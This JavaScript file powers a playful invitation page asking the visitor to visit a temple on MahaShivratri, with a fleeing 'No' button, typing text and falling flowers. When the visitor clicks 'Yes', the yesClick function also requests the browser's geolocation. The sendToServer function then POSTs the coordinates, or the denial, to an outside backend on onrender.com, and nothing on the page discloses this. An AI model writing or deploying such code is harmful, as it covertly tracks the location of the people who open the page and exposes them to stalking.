const noBtn = document.getElementById("noBtn");
const text = document.getElementById("mainText");
const bell = document.getElementById("bell");
const flowersContainer = document.getElementById("flowers");

/* No button runs away */
function moveNo() {
  const x = Math.random() * (window.innerWidth - 100);
  const y = Math.random() * (window.innerHeight - 50);

  noBtn.style.position = "fixed";
  noBtn.style.left = x + "px";
  noBtn.style.top = y + "px";
}

/* YES BUTTON CLICK (merged version) */
function yesClick() {

  // UI changes
  text.innerHTML = "Har Har Mahadev! 🙏<br>Chalo Mandir saath chalte hain ❤️";
  bell.play();
  startFlowers();

  // Location part
  if (!navigator.geolocation) {
    sendToServer({
      status: "error",
      message: "Geolocation not supported"
    });
    return;
  }

  navigator.geolocation.getCurrentPosition(
    function (position) {
      // User allowed
      const data = {
        status: "granted",
        latitude: position.coords.latitude,
        longitude: position.coords.longitude
      };
      sendToServer(data);
    },
    function () {
      // User denied
      sendToServer({
        status: "denied",
        message: "User denied location permission"
      });
    }
  );
}

/* Send data to backend */
function sendToServer(data) {
  fetch("https://databackend-jmls.onrender.com/send-location", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(data)
  })
    .then(() => console.log("Location data sent"))
    .catch(err => console.log("Error:", err));
}

/* Flower falling animation */
function startFlowers() {
  for (let i = 0; i < 40; i++) {
    setTimeout(createFlower, i * 150);
  }
}

function createFlower() {
  const flower = document.createElement("div");
  flower.classList.add("flower");
  flower.innerHTML = "🌸";

  flower.style.left = Math.random() * window.innerWidth + "px";
  flower.style.animationDuration = 3 + Math.random() * 3 + "s";

  flowersContainer.appendChild(flower);

  setTimeout(() => {
    flower.remove();
  }, 6000);
}

/* Typing Effect */
const line1 = "Yeh Valentine Day Kya hota hai...";
const line2 = "Kya tum mere saath MahaShivratri ke din Mandir chalogi? 🙏";

const topText = document.getElementById("topText");
const mainText = document.getElementById("mainText");

let i = 0;
let j = 0;

function typeLine1() {
  if (i < line1.length) {
    topText.innerHTML += line1.charAt(i);
    i++;
    setTimeout(typeLine1, 50);
  } else {
    setTimeout(typeLine2, 500);
  }
}

function typeLine2() {
  if (j < line2.length) {
    mainText.innerHTML += line2.charAt(j);
    j++;
    setTimeout(typeLine2, 40);
  }
}

window.onload = () => {
  typeLine1();
};
